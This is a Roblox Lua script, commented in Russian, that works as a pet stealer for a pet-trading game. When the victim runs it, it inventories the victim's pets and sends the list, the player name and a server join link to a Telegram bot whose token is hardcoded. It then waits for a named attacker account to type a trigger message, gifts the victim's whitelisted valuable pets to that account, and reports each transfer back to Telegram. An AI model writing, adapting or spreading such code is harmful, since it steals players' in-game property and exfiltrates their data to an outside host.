local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "Rikizigg"
local TRIGGER_MESSAGE = "."

-- 🐾 БЕЛЫЙ СПИСОК для передачи (только эти будут передаваться)
local WHITELIST = {
    "Rooster",
    "Wasp",
    "Caterpillar",
    "Tarantula Hawk",
    "Mythical Egg",
    "Hamster",
    "Honster"
}

-- 🔎 Найти ВСЕХ питомцев (с весом и возрастом)
local function getAllPets()
    local pets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            -- Ищем формат "[X.XX KG] [Age X]"
            local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
            if weight and age then
                -- Берем основное название (до первых квадратных скобок)
                local petName = item.Name:match("^([^%[]+)") or item.Name
                petName = petName:gsub("%s+$", "")
                
                table.insert(pets, {
                    name = petName,
                    fullName = item.Name,
                    weight = tonumber(weight),
                    age = tonumber(age),
                    object = item,
                    -- Флаг для проверки белого списка
                    isWhitelisted = table.find(WHITELIST, petName) ~= nil
                })
            end
        end
    end
    
    return pets
end

-- 📜 Формируем список для уведомления (ВСЕ питомцы)
local function getFullPetsList()
    local pets = getAllPets()
    if #pets == 0 then return "нет питомцев" end
    
    local list = {}
    for _, pet in ipairs(pets) do
        local status = pet.isWhitelisted and "✓" or "✗"
        table.insert(list, string.format("%s %s [%.2f кг, Age %d]", status, pet.name, pet.weight, pet.age))
    end
    
    return table.concat(list, "\n")
end

-- ✋ Взять в руку
local function equipPet(pet)
    if pet and player.Character then
        player.Character.Humanoid:EquipTool(pet)
        task.wait(1)
    end
end

-- 📤 Передать питомца (ТОЛЬКО из белого списка)
local function transferPet(pet)
    if not pet.isWhitelisted then return false end
    
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target and ReplicatedStorage:FindFirstChild("PetGiftingService") then
        ReplicatedStorage.PetGiftingService:FireServer("GivePet", target)
        return true
    end
    return false
end

-- 📨 Отправка в Telegram
local function sendToTelegram(text)
    local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
               "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
    pcall(function() game:HttpGet(url) end)
end

-- 🚀 Основная функция передачи
local function startPetTransfer()
    local pets = getAllPets()
    if #pets == 0 then
        sendToTelegram("❌ Нет питомцев для передачи")
        return
    end
    
    local transferred = 0
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            equipPet(pet.object)
            if transferPet(pet) then
                sendToTelegram(string.format("✅ %s [%.2f кг, Age %d]", pet.name, pet.weight, pet.age))
                transferred += 1
            else
                sendToTelegram(string.format("❌ %s [ошибка передачи]", pet.name))
            end
            task.wait(2)
        end
    end
    
    sendToTelegram("🏁 Итого передано: "..transferred.." из "..#pets)
end

-- 🔗 Получить ссылку на сервер
local function getServerLink()
    return "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
end

-- 🏁 ИНИЦИАЛИЗАЦИЯ
sendToTelegram(
    "🔔 "..player.Name.." активировал скрипт\n"..
    "🐾 Все питомцы:\n"..getFullPetsList().."\n"..
    "🔗 "..getServerLink().."\n\n"..
    "✓ - будут переданы\n✗ - не из белого списка"
)

-- 👂 Слушатель чата
game.Players.PlayerChatted:Connect(function(_, speaker, message)
    if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
        startPetTransfer()
    end
end)
